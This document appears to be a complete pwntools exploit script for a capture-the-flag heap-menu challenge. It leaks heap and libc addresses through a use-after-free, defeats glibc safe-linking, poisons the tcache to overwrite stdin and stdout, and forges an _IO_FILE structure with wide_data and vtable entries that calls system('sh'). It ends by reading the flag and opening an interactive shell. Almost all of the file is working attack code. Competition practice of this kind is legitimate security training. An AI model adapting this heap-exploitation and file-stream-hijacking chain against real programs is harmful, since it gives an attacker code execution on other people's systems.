#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'pwn-14caf623.p1.securinets.tn', 9091

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x1b67
c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
def add(idx, name, effect, cost=1, cooldown=1, element=1):
    sla(b'Choice:', b'1')
    sla(b'(0-31):', str(idx).encode())
    sla(b'name:', name)
    sla(b'effect:', effect)
    sla(b'cost:', str(cost).encode())
    sla(b'(in seconds):', str(cooldown).encode())
    sla(b'element:', str(element).encode())

def edit(idx, name, effect, cost=1, cooldown=1, element=1):
    sla(b'Choice:', b'2')
    sla(b'(0-31):', str(idx).encode())
    sla(b'name:', name)
    sla(b'effect:', effect)
    sla(b'cost:', str(cost).encode())
    sla(b'(in seconds):', str(cooldown).encode())
    sla(b'element:', str(element).encode())

def view():
    sla(b'Choice:', b'3')

def delete(idx):
    sla(b'Choice:', b'4')
    sla(b'(0-31):', str(idx).encode())

def feedback(size, feedback):
    sla(b'Choice:', b'5')
    sla(b':', str(size).encode())
    sa(b':', feedback)

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    for i in range(12):
        add(i, b'bruh', b'bruh')

    delete(0)
    delete(1)

    view()
    rcu(b'Slot 1:')
    heap = u64(rcu(b'Name: ', b'\n').ljust(8, b'\x00'))
    heap = demangle(heap) - 0x2a0

    for i in range(2, 9):
        delete(i)

    end = mangle(heap, 0x0)
    edit(1, p64(mangle(heap, heap+0x2a0))+p64(0x81)+p64(end), b'bruh') # fake size (0x81) and fix tcache link
    edit(8, p64(mangle(heap, heap+0x320)), b'bruh') # corrupt *next fastbin 

    add(0, b'bruh', b'bruh')
    add(1, b'bruh', b'bruh', 0x0, 0x0, 0x481) # overwrite size

    delete(2)
    view()
    rcu(b'Slot 2:')
    libc.address = u64(rcu(b'Name: ', b'\n').ljust(8, b'\x00')) - 0x203b20
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']

    # consume unsorted bin while fix tcache links
    for i in range(9):
        add(0, p64(mangle(heap, heap+0x320+(0x80*i))), b'bruh')

    # tcache poisoning
    edit(6, p64(mangle(heap, stdin+0x30)), b'bruh')
    feedback(0x70, b'consume')
    feedback(0x70, flat([
        stdout,
        stdout,
        stdout+0x300,
    ]))

    fp = stdout
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    sleep(0.2)
    sl(overlap)
    io.sendline(b'cat /home/ctf/flag*')

    log.info("heap: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("stdout: %#x", stdout)
    log.info("stdin: %#x", stdin)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
